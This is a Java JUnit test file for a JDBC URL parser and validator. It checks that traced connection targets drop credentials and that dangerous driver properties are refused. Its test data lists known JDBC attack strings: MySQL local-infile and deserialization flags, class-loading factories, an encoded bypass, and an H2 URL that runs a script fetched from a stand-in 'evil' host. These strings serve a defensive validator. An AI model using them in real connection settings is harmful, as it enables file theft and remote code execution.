/**
 * Copyright 2025-2026 Naftiko
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except
 * in compliance with the License. You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software distributed under the License
 * is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express
 * or implied. See the License for the specific language governing permissions and limitations under
 * the License.
 */
package io.ikanos.engine.consumes.sql;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.util.Map;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

class JdbcUrlTest {

    @Test
    void spanTargetShouldNameSystemHostAndDatabaseOfAPostgresUrl() {
        JdbcUrl url = JdbcUrl.parse("jdbc:postgresql://db.internal:5432/erp?ssl=true");

        assertEquals("postgresql://db.internal/erp", url.spanTarget());
    }

    @Test
    void spanTargetShouldReadTheDatabaseNamePropertyOfASqlServerUrl() {
        JdbcUrl url = JdbcUrl.parse("jdbc:sqlserver://wh:1433;databaseName=billing;encrypt=true");

        assertEquals("sqlserver://wh/billing", url.spanTarget());
    }

    @Test
    void spanTargetShouldNotReadADatabaseNameFromABracedSqlServerPassword() {
        JdbcUrl url = JdbcUrl.parse("jdbc:sqlserver://db:1433;"
                + "password={prefix;databaseName=su}}ffix};databaseName=billing");

        assertEquals("sqlserver://db/billing", url.spanTarget());
    }

    @Test
    void spanTargetShouldLeaveOutABracedSqlServerDatabaseName() {
        JdbcUrl url = JdbcUrl.parse("jdbc:sqlserver://db:1433;databaseName={bil;ling}");

        assertEquals("sqlserver://db", url.spanTarget());
    }

    @Test
    void spanTargetShouldReadAnOracleThinUrl() {
        JdbcUrl url = JdbcUrl.parse("jdbc:oracle:thin:@//ora.internal:1521/FINANCE");

        assertEquals("oracle://ora.internal/FINANCE", url.spanTarget());
    }

    @Test
    void spanTargetShouldNameAFileDatabaseWithoutItsDirectory() {
        JdbcUrl url = JdbcUrl.parse("jdbc:sqlite:/var/data/catalog.db");

        assertEquals("sqlite://local/catalog.db", url.spanTarget());
    }

    @Test
    void spanTargetShouldDropTheCredentialsOfAnOracleThinSidUrl() {
        JdbcUrl url = JdbcUrl.parse("jdbc:oracle:thin:scott/s3cret@ora.internal:1521:FIN");

        assertEquals("oracle://ora.internal/FIN", url.spanTarget());
        assertEquals("FIN", url.database());
    }

    @Test
    void spanTargetShouldNotReadAnUnknownShapeThatCarriesAnAt() {
        JdbcUrl url = JdbcUrl.parse("jdbc:acme:admin/s3cret@db:9999:main");

        assertFalse(url.spanTarget().contains("s3cret"), url.spanTarget());
        assertEquals(null, url.database());
    }

    @Test
    void dialectShouldFollowTheSubprotocol() {
        assertEquals(SqlStatement.Dialect.SQLSERVER,
                JdbcUrl.parse("jdbc:sqlserver://wh:1433").dialect());
        assertEquals(SqlStatement.Dialect.POSTGRESQL,
                JdbcUrl.parse("jdbc:postgresql://db/erp").dialect());
        assertEquals(SqlStatement.Dialect.SQLITE, JdbcUrl.parse("jdbc:sqlite:x.db").dialect());
        assertEquals(SqlStatement.Dialect.STANDARD, JdbcUrl.parse("jdbc:h2:mem:x").dialect());
    }

    @Test
    void spanTargetShouldNeverCarryCredentials() {
        JdbcUrl url = JdbcUrl.parse("jdbc:postgresql://admin:s3cret@db:5432/erp?password=x");

        assertFalse(url.spanTarget().contains("s3cret"), url.spanTarget());
        assertFalse(url.spanTarget().contains("password"), url.spanTarget());
    }

    @Test
    void checkShouldRefuseAUrlThatIsNotJdbc() {
        IllegalArgumentException e = assertThrows(IllegalArgumentException.class,
                () -> JdbcUrl.check("erp", "https://db.internal/erp", Map.of()));

        assertFalse(e.getMessage().contains("db.internal"), e.getMessage());
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "jdbc:mysql://db/erp?allowLoadLocalInfile=true",
        "jdbc:mariadb://db/erp?user=a&autoDeserialize=true",
        "jdbc:postgresql://db/erp?socketFactory=x.Y",
        "jdbc:postgresql://db/erp?sslfactory=x.Y",
        "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil/x.sql'"
    })
    void checkShouldRefuseDangerousDriverPropertiesInTheUrl(String url) {
        IllegalArgumentException e = assertThrows(IllegalArgumentException.class,
                () -> JdbcUrl.check("erp", url, Map.of()));

        assertTrue(e.getMessage().contains("refused"), e.getMessage());
    }

    @Test
    void checkShouldRefuseDangerousDriverPropertiesInConnectionProperties() {
        assertThrows(IllegalArgumentException.class, () -> JdbcUrl.check("erp",
                "jdbc:mysql://db/erp", Map.of("AllowLoadLocalInfile", "true")));
    }

    @Test
    void checkShouldAcceptOrdinaryDriverProperties() {
        JdbcUrl url = JdbcUrl.check("erp", "jdbc:postgresql://db/erp?ssl=true&sslmode=verify-full",
                Map.of("ApplicationName", "ikanos"));

        assertEquals("postgresql", url.system());
    }

    @ParameterizedTest
    @ValueSource(strings = {
        "jdbc:mysql://(host=db,port=3306,allowLoadLocalInfile=true)/erp",
        "jdbc:mysql://address=(host=db)(queryInterceptors=x.Y)/erp",
        "jdbc:mysql://db/erp?allowLoad%4CocalInfile=true",
        "jdbc:sqlserver://db:1433;trustManagerClass=x.Y"
    })
    void checkShouldRefuseDangerousPropertiesInEveryUrlForm(String url) {
        assertThrows(IllegalArgumentException.class, () -> JdbcUrl.check("erp", url, Map.of()));
    }

    @Test
    void mysqlDialectShouldHoldForMysqlAndMariadbOnly() {
        assertTrue(JdbcUrl.parse("jdbc:mysql://db/erp").mysqlDialect());
        assertTrue(JdbcUrl.parse("jdbc:mariadb://db/erp").mysqlDialect());
        assertFalse(JdbcUrl.parse("jdbc:postgresql://db/erp").mysqlDialect());
    }

    @Test
    void spanTargetShouldReadOnlyTheHostOfAMysqlKeyValueAuthority() {
        JdbcUrl url = JdbcUrl.parse(
                "jdbc:mysql://(host=db,port=3306,user=reader,password=s3cret)/erp");

        assertEquals("mysql://db/erp", url.spanTarget());
    }

    @Test
    void spanTargetShouldReadOnlyTheHostOfAMysqlAddressAuthority() {
        JdbcUrl url = JdbcUrl.parse("jdbc:mysql://address=(host=db)(password=s3cret)/erp");

        assertEquals("mysql://db/erp", url.spanTarget());
    }
}
